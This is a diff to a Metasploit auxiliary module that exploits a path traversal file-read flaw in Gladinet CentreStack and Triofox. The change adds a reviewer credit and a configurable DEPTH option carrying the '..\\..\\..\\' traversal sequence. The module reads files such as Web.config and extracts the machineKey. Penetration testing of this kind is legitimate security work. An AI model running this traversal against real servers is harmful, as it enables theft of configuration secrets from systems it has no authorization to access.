@@ -30,7 +30,8 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'Huntress Team', # Vulnerability discovery
           'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit module
-          'Julien Voisin' # Review
+          'Julien Voisin', # Review
+          'jheysel-r7' # Review
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -49,6 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
       OptString.new('FILEPATH', [true, 'The file to read on the target', DEFAULT_WEB_CONFIG_PATH]),
+      OptString.new('DEPTH', [true, 'Path traversal depth (number of ..\\ sequences)', '..\\..\\..\\']),
       OptBool.new('EXTRACT_MACHINEKEY', [true, 'Extract machineKey from Web.config if found', true])
     ])
   end
@@ -60,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
   def build_lfi_path(file_path)
     # Remove C:\ prefix if present (LFI doesn't work with drive letters)
     normalized_path = file_path.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')
-    "..\\..\\..\\#{normalized_path.gsub(' ', '+')}"
+    "#{datastore['DEPTH']}#{normalized_path.gsub(' ', '+')}"
   end
 
   def send_lfi_request(file_path)
